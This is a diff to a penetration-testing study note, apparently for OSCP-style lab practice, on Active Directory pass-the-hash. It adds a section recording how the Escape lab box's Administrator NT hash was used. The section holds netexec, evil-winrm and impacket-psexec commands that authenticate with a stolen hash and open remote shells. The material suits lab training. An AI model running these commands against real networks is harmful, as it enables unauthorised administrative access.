@@ -1,3 +1,7 @@
+---
+box_sources: [Escape]
+---
+
 # AD - Pass the Hash
 
 **Step 49 of 50 · AD**
@@ -63,6 +67,18 @@ Pass-the-hash uses the NTLM hash directly. Do not print `$AdminHash` in terminal
 - [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- used hash-based access for the optional stable ROCK shell and documented the distinction between local and domain Administrator
 - [[OSCP/BOXES/WRITE UPS/AD/Fermion|Fermion]] -- validated the offline NTDS Administrator hash with NetExec WinRM and one-shot WMI commands
+
+## Escape evidence
+
+Escape obtained the Administrator NT hash through certificate authentication rather than NTDS extraction. Validate the hash over SMB, then use WinRM or an Impacket service shell as the transport.
+
+```bash
+netexec smb "$BoxIP" -u "$AdminUser" -H "$AdminHash" -d "$Domain"
+evil-winrm -i "$BoxIP" -u "$AdminUser" -H "$AdminHash"
+impacket-psexec -hashes ":$AdminHash" "$Domain/$AdminUser@$BoxIP"
+```
+
+See [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]] and [[AD - Certificate Services ESC1]].
 
 ## Related stages
 
